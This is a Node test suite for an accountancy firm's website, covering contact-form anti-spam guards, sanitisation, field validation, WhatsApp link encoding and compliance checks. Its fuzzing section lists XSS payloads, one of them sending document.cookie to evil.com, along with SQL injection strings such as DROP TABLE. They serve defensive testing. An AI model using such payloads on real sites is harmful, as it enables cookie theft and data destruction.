/**
 * tests/challenger_m2_components_stress.mjs
 * 
 * EMPIRICAL CHALLENGER TEST SUITE: Milestone 2 Adversarial Stress Verification
 * 
 * Focus Areas:
 * 1. ContactForm Anti-Spam Honeypot & Velocity Guards
 * 2. Payload Fuzzing, Sanitization & Field-Level Boundary Enforcement
 * 3. WhatsApp Click-to-Chat Deep-Link URI Encoding & Target Integrity
 * 4. Route Continuity: Active /blog Links & Complete serviceFootprint Loop
 * 5. Professional Compliance (R4 Safeguards): Neutral CrestMonogram, Zero Partner Photo,
 *    Verbatim ICMAI Attribution, and Zero Unapproved FRNs or Personal Tax Identifiers.
 * 6. Component Architecture & Accessibility Hardening
 */

import assert from 'assert';
import path from 'path';
import fs from 'fs';
import { createServer } from 'vite';

console.log('================================================================================');
console.log('  CHALLENGER M2: CONTACTFORM ANTI-SPAM, PAYLOAD FUZZING & R4 INTEGRITY AUDIT   ');
console.log('================================================================================\n');

let totalTests = 0;
let passedTests = 0;
const failureLog = [];

function assertTest(suiteName, testName, testFn) {
  totalTests++;
  try {
    testFn();
    passedTests++;
    console.log(`\x1b[32m✔ PASS\x1b[0m [${totalTests}] [${suiteName}] ${testName}`);
  } catch (error) {
    failureLog.push({ suiteName, testName, message: error.message });
    console.log(`\x1b[31m✖ FAIL\x1b[0m [${totalTests}] [${suiteName}] ${testName}`);
    console.log(`       Error: ${error.message}`);
  }
}

async function assertAsyncTest(suiteName, testName, asyncFn) {
  totalTests++;
  try {
    await asyncFn();
    passedTests++;
    console.log(`\x1b[32m✔ PASS\x1b[0m [${totalTests}] [${suiteName}] ${testName}`);
  } catch (error) {
    failureLog.push({ suiteName, testName, message: error.message });
    console.log(`\x1b[31m✖ FAIL\x1b[0m [${totalTests}] [${suiteName}] ${testName}`);
    console.log(`       Error: ${error.message}`);
  }
}

// -----------------------------------------------------------------------------
// Initialize Vite SSR for runtime execution of TypeScript modules
// -----------------------------------------------------------------------------
let vite = null;
let backendAdapter = null;

try {
  vite = await createServer({
    server: { middlewareMode: true },
    appType: 'custom',
  });
  backendAdapter = await vite.ssrLoadModule('/src/v8/adapters/backendAdapter.ts');
} catch (err) {
  console.error('Failed to initialize Vite SSR runner for backendAdapter:', err);
  process.exit(1);
}

const {
  checkAntiSpam,
  validateEnquiryPayload,
  sanitizeText,
  generateWhatsAppUrl,
  submitEnquiry,
  getFirmProfile,
} = backendAdapter;

// =============================================================================
// SUITE 1: ContactForm Anti-Spam Adversarial Vectors
// =============================================================================
console.log('\n▶ SUITE 1: ContactForm Anti-Spam Honeypot & Velocity Guards');

// 1.1 Honeypot Bot Autofill Trapping
const honeypotAttackVectors = [
  { val: 'http://spam-casino.ru/promo', desc: 'URL spam payload' },
  { val: '1234567890', desc: 'Numeric fax field autofill' },
  { val: 'bot@spambot.net', desc: 'Email address populated into fax field' },
  { val: '+1-800-555-0199', desc: 'Standard telephone bot injection' },
  { val: 'null', desc: 'String literal "null"' },
  { val: 'undefined', desc: 'String literal "undefined"' },
  { val: 'false', desc: 'String literal "false"' },
  { val: '0', desc: 'Single digit zero' },
  { val: '   spam text with padding   ', desc: 'Whitespace padded text' },
];

for (const attack of honeypotAttackVectors) {
  assertTest('Suite 1: Honeypot', `Honeypot blocks bot vector: ${attack.desc}`, () => {
    const res = checkAntiSpam({
      website_fax_hp: attack.val,
      formLoadedAt: Date.now() - 5000,
    });
    assert.strictEqual(res.passed, false, `Honeypot must reject "${attack.val}"`);
    assert.strictEqual(res.reason, 'HONEYPOT_TRIGGERED');
    assert.ok(res.error && res.error.includes('Automated submission detected'));
  });
}

assertTest('Suite 1: Honeypot', 'Honeypot allows legitimate human submission with empty string', () => {
  const res = checkAntiSpam({
    website_fax_hp: '',
    formLoadedAt: Date.now() - 5000,
  });
  assert.strictEqual(res.passed, true);
});

assertTest('Suite 1: Honeypot', 'Honeypot allows legitimate human submission when undefined', () => {
  const res = checkAntiSpam({
    website_fax_hp: undefined,
    formLoadedAt: Date.now() - 5000,
  });
  assert.strictEqual(res.passed, true);
});

// 1.2 Velocity Attack Timing Vectors (< 1500ms)
const rapidTimings = [
  { elapsed: 0, desc: 'Instantaneous bot submission (0ms)' },
  { elapsed: 50, desc: 'Ultra-fast script submission (50ms)' },
  { elapsed: 300, desc: 'Headless automation submission (300ms)' },
  { elapsed: 950, desc: 'Fast autofill submission (950ms)' },
  { elapsed: 1499, desc: 'Edge boundary below threshold (1499ms)' },
];

for (const timing of rapidTimings) {
  assertTest('Suite 1: Velocity', `Velocity check blocks rapid submission: ${timing.desc}`, () => {
    const res = checkAntiSpam({
      formLoadedAt: Date.now() - timing.elapsed,
    }, 1500);
    assert.strictEqual(res.passed, false, `Velocity guard must reject elapsed=${timing.elapsed}ms`);
    assert.strictEqual(res.reason, 'VELOCITY_TOO_FAST');
    assert.ok(res.error && res.error.includes('Submission received too rapidly'));
  });
}

assertTest('Suite 1: Velocity', 'Velocity check permits submission at boundary threshold (1500ms)', () => {
  const res = checkAntiSpam({
    formLoadedAt: Date.now() - 1500,
  }, 1500);
  assert.strictEqual(res.passed, true, 'Submissions at 1500ms must pass');
});

assertTest('Suite 1: Velocity', 'Velocity check permits normal human submission (5000ms)', () => {
  const res = checkAntiSpam({
    formLoadedAt: Date.now() - 5000,
  }, 1500);
  assert.strictEqual(res.passed, true);
});

assertTest('Suite 1: Velocity', 'Velocity check blocks spoofed timestamp in the future', () => {
  // If bot sends formLoadedAt in future (+10000ms), elapsed is negative (< 1500ms)
  const res = checkAntiSpam({
    formLoadedAt: Date.now() + 10000,
  }, 1500);
  assert.strictEqual(res.passed, false, 'Future timestamp must be blocked');
  assert.strictEqual(res.reason, 'VELOCITY_TOO_FAST');
});

// 1.3 End-to-End submitEnquiry Anti-Spam Rejection
await assertAsyncTest('Suite 1: End-to-End', 'submitEnquiry rejects honeypot attack without registering', async () => {
  const res = await submitEnquiry({
    fullName: 'Spam Bot 3000',
    phone: '+91 98765 43210',
    email: 'bot@spam.com',
    message: 'We offer SEO backlinks and marketing services.',
    website_fax_hp: 'fax-payload-injection',
    formLoadedAt: Date.now() - 3000,
  });
  assert.strictEqual(res.success, false);
  assert.strictEqual(res.data, undefined);
  assert.ok(res.error && res.error.includes('Automated submission detected'));
});

await assertAsyncTest('Suite 1: End-to-End', 'submitEnquiry rejects velocity attack under 1500ms', async () => {
  const res = await submitEnquiry({
    fullName: 'Rapid Script User',
    phone: '+91 98765 43210',
    email: 'fast@script.com',
    message: 'Rapid automated submission payload testing.',
    formLoadedAt: Date.now() - 200, // Only 200ms elapsed
  });
  assert.strictEqual(res.success, false);
  assert.strictEqual(res.data, undefined);
  assert.ok(res.error && res.error.includes('Submission received too rapidly'));
});

// =============================================================================
// SUITE 2: Payload Fuzzing, Sanitization & Validation Boundaries
// =============================================================================
console.log('\n▶ SUITE 2: Payload Fuzzing, Sanitization & Validation Boundaries');

// 2.1 XSS & Injection Sanitization
const xssPayloads = [
  { raw: '<script>alert("XSS")</script>', expected: 'alert("XSS")', desc: 'Standard script tags' },
  { raw: '<img src=x onerror=alert(document.cookie)>', expected: '', desc: 'Self-closing image tag with onerror event' },
  { raw: '<svg onload=fetch("http://evil.com/"+document.cookie)>', expected: '', desc: 'SVG onload payload' },
  { raw: '<iframe src="https://evil.com"></iframe>Hello', expected: 'Hello', desc: 'Iframe injection' },
  { raw: '<b>Bold</b> and <i>Italic</i>', expected: 'Bold and Italic', desc: 'Standard HTML formatting tags' },
  { raw: 'Normal Text with No Tags', expected: 'Normal Text with No Tags', desc: 'Clean unformatted text' },
];

for (const xss of xssPayloads) {
  assertTest('Suite 2: XSS', `sanitizeText cleans ${xss.desc}`, () => {
    const cleaned = sanitizeText(xss.raw);
    assert.strictEqual(cleaned, xss.expected);
    assert.doesNotMatch(cleaned, /<[^>]*>/, 'Output must contain zero HTML tags');
  });
}

// 2.2 SQL Injection & Null Byte Resistance
const sqlPayloads = [
  "' OR '1'='1",
  "'; DROP TABLE enquiries; --",
  "\" UNION SELECT null, username, password FROM users --",
  "1' ORDER BY 1,2,3--+",
  "Test\0Message\0NullByte",
];

for (const sql of sqlPayloads) {
  assertTest('Suite 2: SQLi/NullBytes', `Payload handles SQL string without crashing: "${sql.slice(0, 20)}..."`, () => {
    const cleaned = sanitizeText(sql);
    assert.strictEqual(typeof cleaned, 'string');
    // Does not throw and returns string
  });
}

// 2.3 Field Validation Boundaries: Name
assertTest('Suite 2: Boundaries', 'Full Name rejects empty or whitespace-only', () => {
  const r1 = validateEnquiryPayload({ fullName: '', phone: '+91 98765 43210', email: 'a@b.com', message: 'Hello world' });
  assert.strictEqual(Boolean(r1.errors.fullName), true);
  const r2 = validateEnquiryPayload({ fullName: '   ', phone: '+91 98765 43210', email: 'a@b.com', message: 'Hello world' });
  assert.strictEqual(Boolean(r2.errors.fullName), true);
});

assertTest('Suite 2: Boundaries', 'Full Name rejects 1 character (min is 2)', () => {
  const r = validateEnquiryPayload({ fullName: 'A', phone: '+91 98765 43210', email: 'a@b.com', message: 'Hello world' });
  assert.strictEqual(r.errors.fullName, 'Full Name must be at least 2 characters.');
});

assertTest('Suite 2: Boundaries', 'Full Name accepts 2 characters boundary', () => {
  const r = validateEnquiryPayload({ fullName: 'KV', phone: '+91 98765 43210', email: 'a@b.com', message: 'Hello world' });
  assert.strictEqual(r.errors.fullName, undefined);
});

assertTest('Suite 2: Boundaries', 'Full Name rejects > 100 characters', () => {
  const longName = 'A'.repeat(101);
  const r = validateEnquiryPayload({ fullName: longName, phone: '+91 98765 43210', email: 'a@b.com', message: 'Hello world' });
  assert.strictEqual(r.errors.fullName, 'Full Name cannot exceed 100 characters.');
});

// 2.4 Field Validation Boundaries: Phone Number
const invalidPhones = [
  { val: '', desc: 'Empty telephone' },
  { val: 'abcdefghij', desc: 'Alphabetic text' },
  { val: '123456', desc: 'Only 6 digits (min is 7)' },
  { val: '123456789012345678901', desc: '21 characters (max is 20)' },
  { val: '++??==', desc: 'Punctuation only' },
];

for (const p of invalidPhones) {
  assertTest('Suite 2: Boundaries', `Phone validation rejects invalid format: ${p.desc}`, () => {
    const r = validateEnquiryPayload({ fullName: 'R. Sundaram', phone: p.val, email: 'a@b.com', message: 'Hello world' });
    assert.strictEqual(Boolean(r.errors.phone), true);
  });
}

const validPhones = [
  '+91 96263 50900',
  '+919626350900',
  '9626350900',
  '0877-2244556',
  '+91 (877) 224-4556',
];

for (const vp of validPhones) {
  assertTest('Suite 2: Boundaries', `Phone validation accepts legitimate format: ${vp}`, () => {
    const r = validateEnquiryPayload({ fullName: 'R. Sundaram', phone: vp, email: 'a@b.com', message: 'Hello world' });
    assert.strictEqual(r.errors.phone, undefined);
  });
}

// 2.5 Field Validation Boundaries: Email
const invalidEmails = [
  { val: '', desc: 'Empty email' },
  { val: 'plainaddress', desc: 'Missing @ symbol' },
  { val: '@missingusername.com', desc: 'Missing username before @' },
  { val: 'username@.com', desc: 'Missing domain host before dot' },
  { val: 'username@com', desc: 'Missing top level domain dot' },
  { val: 'user space@domain.com', desc: 'Contains illegal whitespace' },
  { val: 'A'.repeat(250) + '@domain.com', desc: 'Exceeds maximum 254 RFC character limit' },
];

for (const ie of invalidEmails) {
  assertTest('Suite 2: Boundaries', `Email validation rejects malformed format: ${ie.desc}`, () => {
    const r = validateEnquiryPayload({ fullName: 'R. Sundaram', phone: '+91 98765 43210', email: ie.val, message: 'Hello world' });
    assert.strictEqual(Boolean(r.errors.email), true);
  });
}

assertTest('Suite 2: Boundaries', 'Email validation accepts valid email: contact@company.in', () => {
  const r = validateEnquiryPayload({ fullName: 'R. Sundaram', phone: '+91 98765 43210', email: 'contact@company.in', message: 'Hello world' });
  assert.strictEqual(r.errors.email, undefined);
});

// 2.6 Field Validation Boundaries: Message Length
assertTest('Suite 2: Boundaries', 'Message rejects < 5 characters', () => {
  const r = validateEnquiryPayload({ fullName: 'R. Sundaram', phone: '+91 98765 43210', email: 'a@b.com', message: 'Help' });
  assert.strictEqual(r.errors.message, 'Requirement summary must be at least 5 characters.');
});

assertTest('Suite 2: Boundaries', 'Message accepts exactly 5 characters boundary', () => {
  const r = validateEnquiryPayload({ fullName: 'R. Sundaram', phone: '+91 98765 43210', email: 'a@b.com', message: 'Audit' });
  assert.strictEqual(r.errors.message, undefined);
});

assertTest('Suite 2: Boundaries', 'Message rejects > 3000 characters', () => {
  const longMsg = 'M'.repeat(3001);
  const r = validateEnquiryPayload({ fullName: 'R. Sundaram', phone: '+91 98765 43210', email: 'a@b.com', message: longMsg });
  assert.strictEqual(r.errors.message, 'Requirement summary cannot exceed 3000 characters.');
});

// =============================================================================
// SUITE 3: WhatsApp Click-to-Chat Deep-Link URI Encoding
// =============================================================================
console.log('\n▶ SUITE 3: WhatsApp Click-to-Chat Deep-Link URI Encoding');

assertTest('Suite 3: WhatsApp', 'Target phone number strictly maps to +91 96263 50900 (clean: 919626350900)', () => {
  const url = generateWhatsAppUrl({});
  assert.ok(url.startsWith('https://wa.me/919626350900'));
});

assertTest('Suite 3: WhatsApp', 'Direct service enquiry URL correctly formats practice name and encoded text', () => {
  const url = generateWhatsAppUrl({ directServiceName: 'Statutory Audit & Assurance' });
  assert.ok(url.startsWith('https://wa.me/919626350900?text='));
  const textParam = url.split('?text=')[1];
  assert.ok(textParam.includes('%26'), 'Ampersand in service name must be URL-encoded as %26');
  const decoded = decodeURIComponent(textParam);
  assert.ok(decoded.includes('Statutory Audit & Assurance'));
  assert.ok(decoded.includes('CA Kavitha Vijay (Kavitha & Associates)'));
});

assertTest('Suite 3: WhatsApp', 'Full enquiry brief embeds all metadata with clean URL encoding', () => {
  const options = {
    referenceId: 'ENQ-2026-CHAL-01',
    fullName: 'Sundaram & Co. LLP',
    entityType: 'Limited Liability Partnership (LLP)',
    organization: 'Sundaram Enterprises',
    phone: '+91 98765 43210',
    serviceCategory: 'Direct Tax Advisory & Section 44AB Tax Audit',
    city: 'Tirupati',
    urgency: 'Priority within 48 Hours',
    message: 'Received notice u/s 148 for AY 2023-24; requirement for partner representation.',
  };

  const url = generateWhatsAppUrl(options);
  assert.ok(url.startsWith('https://wa.me/919626350900?text='));
  const textParam = url.split('?text=')[1];

  // Verify that raw ampersands, slashes, and spaces in query parameter are encoded
  assert.ok(!textParam.includes('\n'), 'Raw newlines must not appear in query string');
  assert.ok(!textParam.includes(' '), 'Raw spaces must not appear in query string');

  const decoded = decodeURIComponent(textParam);
  assert.ok(decoded.includes('Enquiry Ref: ENQ-2026-CHAL-01'));
  assert.ok(decoded.includes('Name: Sundaram & Co. LLP'));
  assert.ok(decoded.includes('Entity Type: Limited Liability Partnership (LLP)'));
  assert.ok(decoded.includes('Organization: Sundaram Enterprises'));
  assert.ok(decoded.includes('Phone: +91 98765 43210'));
  assert.ok(decoded.includes('Service Required: Direct Tax Advisory & Section 44AB Tax Audit'));
  assert.ok(decoded.includes('Location: Tirupati'));
  assert.ok(decoded.includes('Urgency: Priority within 48 Hours'));
  assert.ok(decoded.includes('Received notice u/s 148 for AY 2023-24'));
});

assertTest('Suite 3: WhatsApp', 'Special and foreign characters are safely encoded without corruption', () => {
  const url = generateWhatsAppUrl({
    fullName: 'M/s. Balaji & Sons (P) Ltd.',
    message: 'Need GST audit under Section 35(5) & Rule 80(3); Budget: ₹50,000+',
  });
  const textParam = url.split('?text=')[1];
  const decoded = decodeURIComponent(textParam);
  assert.ok(decoded.includes('M/s. Balaji & Sons (P) Ltd.'));
  assert.ok(decoded.includes('₹50,000+'));
});

// =============================================================================
// SUITE 4: Route Continuity & Link Validation (/blog and serviceFootprint)
// =============================================================================
console.log('\n▶ SUITE 4: Route Continuity & Link Validation');

const navbarSource = fs.readFileSync(path.resolve('src/v8/components/layout/Navbar.tsx'), 'utf8');
const footerSource = fs.readFileSync(path.resolve('src/v8/components/layout/Footer.tsx'), 'utf8');
const drawerSource = fs.readFileSync(path.resolve('src/v8/components/layout/MobileDrawer.tsx'), 'utf8');
const layoutSource = fs.readFileSync(path.resolve('src/v8/components/layout/PublicLayout.tsx'), 'utf8');
const skipSource = fs.readFileSync(path.resolve('src/v8/components/layout/SkipToContent.tsx'), 'utf8');

assertTest('Suite 4: Route Continuity', 'Navbar.tsx contains active Link to="/blog"', () => {
  assert.ok(
    /<Link\s+to="\/blog"/.test(navbarSource) || /to="\/blog"/.test(navbarSource),
    'Navbar.tsx must contain to="/blog"'
  );
});

assertTest('Suite 4: Route Continuity', 'Footer.tsx contains active Link to="/blog"', () => {
  assert.ok(
    /<Link\s+to="\/blog"/.test(footerSource) || /to="\/blog"/.test(footerSource),
    'Footer.tsx must contain to="/blog"'
  );
});

assertTest('Suite 4: Route Continuity', 'MobileDrawer.tsx contains active Link to="/blog"', () => {
  assert.ok(
    /<Link\s+to="\/blog"/.test(drawerSource) || /to="\/blog"/.test(drawerSource),
    'MobileDrawer.tsx must contain to="/blog"'
  );
});

assertTest('Suite 4: Route Continuity', 'Footer.tsx contains FIRM_DATA.serviceFootprint.map loop', () => {
  assert.ok(
    /serviceFootprint\.map/.test(footerSource),
    'Footer.tsx must contain serviceFootprint.map loop'
  );
});

assertTest('Suite 4: Service Footprint', 'FIRM_DATA.serviceFootprint contains all 5 mandatory municipal corridors', () => {
  const firmProfile = getFirmProfile();
  assert.ok(Array.isArray(firmProfile.serviceFootprint), 'serviceFootprint must be an array');
  assert.strictEqual(firmProfile.serviceFootprint.length, 5, 'Must contain exactly 5 service footprint cities');

  const cityNames = firmProfile.serviceFootprint.map(loc => loc.city);
  const expectedCities = ['Tirupati', 'Chennai', 'Bengaluru', 'Hyderabad', 'Coimbatore'];

  for (const city of expectedCities) {
    assert.ok(cityNames.includes(city), `serviceFootprint must include ${city} (found: ${cityNames.join(', ')})`);
  }
});

assertTest('Suite 4: Layout Architecture', 'PublicLayout defines #main-content anchor matching SkipToContent target', () => {
  assert.ok(layoutSource.includes('id="main-content"'), 'PublicLayout must have id="main-content"');
  assert.ok(skipSource.includes('href="#main-content"'), 'SkipToContent must anchor to href="#main-content"');
});

assertTest('Suite 4: Layout Architecture', 'PublicLayout wraps public view with ErrorBoundary', () => {
  assert.ok(layoutSource.includes('<ErrorBoundary>'), 'PublicLayout must wrap child outlet in ErrorBoundary');
});

// =============================================================================
// SUITE 5: CrestMonogram & Compliance Audit (R4 Safeguards)
// =============================================================================
console.log('\n▶ SUITE 5: CrestMonogram & Professional Compliance Audit (R4)');

// 5.1 Zero Partner Portrait Image in src/v8/components
const v8ComponentsDir = path.resolve('src/v8/components');
function getAllFilesRecursive(dir) {
  let results = [];
  const list = fs.readdirSync(dir);
  for (const file of list) {
    const fullPath = path.join(dir, file);
    const stat = fs.statSync(fullPath);
    if (stat && stat.isDirectory()) {
      results = results.concat(getAllFilesRecursive(fullPath));
    } else {
      results.push(fullPath);
    }
  }
  return results;
}

const allV8ComponentFiles = getAllFilesRecursive(v8ComponentsDir);

assertTest('Suite 5: Compliance', 'Zero partner portrait image references in src/v8/components/', () => {
  const forbiddenPatterns = [
    /ca-kavitha-vijay\.webp/i,
    /partner-portrait/i,
    /kavitha.*portrait/i,
    /kavitha.*photo/i,
  ];

  for (const file of allV8ComponentFiles) {
    const content = fs.readFileSync(file, 'utf8');
    for (const pat of forbiddenPatterns) {
      assert.doesNotMatch(
        content,
        pat,
        `Forbidden partner photo reference matched pattern ${pat} in ${path.relative(process.cwd(), file)}`
      );
    }
  }
});

// 5.2 ICMAI Attribution for CMA AIR 49 is Present & Verbatim
assertTest('Suite 5: Compliance', 'CrestMonogram.tsx provides explicit verbatim ICMAI attribution for CMA AIR 49', () => {
  const crestSource = fs.readFileSync(path.resolve('src/v8/components/common/CrestMonogram.tsx'), 'utf8');
  assert.ok(
    crestSource.includes('CMA AIR 49 (ICMAI)'),
    'CrestMonogram.tsx must render "CMA AIR 49 (ICMAI)" verbatim'
  );
  assert.ok(
    crestSource.includes('KV'),
    'CrestMonogram.tsx must render neutral KV initials'
  );
});

assertTest('Suite 5: Compliance', 'Navbar.tsx includes explicit ICMAI attribution for CMA AIR 49', () => {
  assert.ok(
    navbarSource.includes('Cost Accountants (ICMAI)') || navbarSource.includes('(ICMAI)'),
    'Navbar.tsx must attribute ICMAI'
  );
  assert.ok(
    navbarSource.includes('CMA AIR 49'),
    'Navbar.tsx must include CMA AIR 49'
  );
});

assertTest('Suite 5: Compliance', 'Footer.tsx includes explicit ICMAI attribution and dual fellowship notice', () => {
  assert.ok(
    footerSource.includes('Cost Accountant (ICMAI)'),
    'Footer.tsx must attribute Cost Accountant (ICMAI)'
  );
  assert.ok(
    footerSource.includes('Dual ICMAI') && footerSource.includes('ICAI Fellow Practice'),
    'Footer.tsx must state "Dual ICMAI & ICAI Fellow Practice"'
  );
});

// 5.3 Zero Unapproved FRNs or Personal Tax Identifiers in src/v8/components
assertTest('Suite 5: Compliance', 'Zero Indian PAN numbers in src/v8/components/', () => {
  const panRegex = /\b[A-Z]{5}[0-9]{4}[A-Z]\b/;
  for (const file of allV8ComponentFiles) {
    const content = fs.readFileSync(file, 'utf8');
    assert.doesNotMatch(
      content,
      panRegex,
      `Unapproved PAN detected in ${path.relative(process.cwd(), file)}`
    );
  }
});

assertTest('Suite 5: Compliance', 'Zero 12-digit Aadhaar patterns in src/v8/components/', () => {
  // Aadhaar: 12 digits, often formatted as XXXX XXXX XXXX starting with 2-9
  const aadhaarRegex = /\b[2-9]\d{3}\s\d{4}\s\d{4}\b/;
  for (const file of allV8ComponentFiles) {
    const content = fs.readFileSync(file, 'utf8');
    assert.doesNotMatch(
      content,
      aadhaarRegex,
      `Unapproved Aadhaar number detected in ${path.relative(process.cwd(), file)}`
    );
  }
});

assertTest('Suite 5: Compliance', 'Zero unapproved FRNs in src/v8/components/', () => {
  const unapprovedFrnRegex = /\b(FRN\s*[:#-]?\s*\d{6}[A-Z]?)\b/i;
  for (const file of allV8ComponentFiles) {
    const content = fs.readFileSync(file, 'utf8');
    assert.doesNotMatch(
      content,
      unapprovedFrnRegex,
      `Unapproved FRN detected in ${path.relative(process.cwd(), file)}`
    );
  }
});

// =============================================================================
// SUITE 6: ContactForm Component Source & Accessibility Architecture
// =============================================================================
console.log('\n▶ SUITE 6: ContactForm Component Architecture & Accessibility');

const contactFormSource = fs.readFileSync(path.resolve('src/v8/components/forms/ContactForm.tsx'), 'utf8');

assertTest('Suite 6: ContactForm', 'Honeypot field is visually hidden and excluded from tab navigation', () => {
  assert.ok(
    contactFormSource.includes('name="website_fax_hp"'),
    'ContactForm must have input name="website_fax_hp"'
  );
  assert.ok(
    contactFormSource.includes('tabIndex={-1}'),
    'Honeypot input must have tabIndex={-1} to prevent keyboard navigation trap'
  );
  assert.ok(
    contactFormSource.includes('aria-hidden="true"'),
    'Honeypot container must have aria-hidden="true" to prevent screen-reader announcement'
  );
  assert.ok(
    contactFormSource.includes('autoComplete="off"'),
    'Honeypot input must have autoComplete="off" to discourage human browser autofill'
  );
});

assertTest('Suite 6: ContactForm', 'Tracks formLoadedAt via useRef for velocity protection', () => {
  assert.ok(
    contactFormSource.includes('formLoadedAt = useRef<number>(Date.now())'),
    'ContactForm must initialize formLoadedAt via useRef on render'
  );
  assert.ok(
    contactFormSource.includes('formLoadedAt: formLoadedAt.current'),
    'ContactForm must pass formLoadedAt.current in submission payload'
  );
});

assertTest('Suite 6: ContactForm', 'Connects directly to submitEnquiry and validateEnquiryPayload', () => {
  assert.ok(
    contactFormSource.includes('submitEnquiry(payload)'),
    'ContactForm must invoke submitEnquiry'
  );
  assert.ok(
    contactFormSource.includes('validateEnquiryPayload(payload)'),
    'ContactForm must invoke validateEnquiryPayload'
  );
});

assertTest('Suite 6: ContactForm', 'Displays submission error banner with role="alert"', () => {
  assert.ok(
    contactFormSource.includes('role="alert"'),
    'Submission error banner must declare role="alert"'
  );
});

assertTest('Suite 6: ContactForm', 'Enforces accessible button hit target min-h-[44px]', () => {
  assert.ok(
    contactFormSource.includes('min-h-[44px]'),
    'Interactive buttons must ensure minimum 44px hit target'
  );
});

// =============================================================================
// SUMMARY & EXIT
// =============================================================================
console.log('\n================================================================================');
console.log(`TOTAL EMPIRICAL ASSERTIONS: ${totalTests}`);
console.log(`PASSED: ${passedTests}`);
console.log(`FAILED: ${failureLog.length}`);
console.log('================================================================================\n');

if (failureLog.length > 0) {
  console.log('\x1b[31mFAILURE BREAKDOWN:\x1b[0m');
  for (const f of failureLog) {
    console.log(` - [${f.suiteName}] ${f.testName}: ${f.message}`);
  }
  process.exit(1);
} else {
  console.log('\x1b[32mALL EMPIRICAL CHALLENGER ASSERTIONS PASSED WITH ZERO FAILURES!\x1b[0m\n');
  process.exit(0);
}
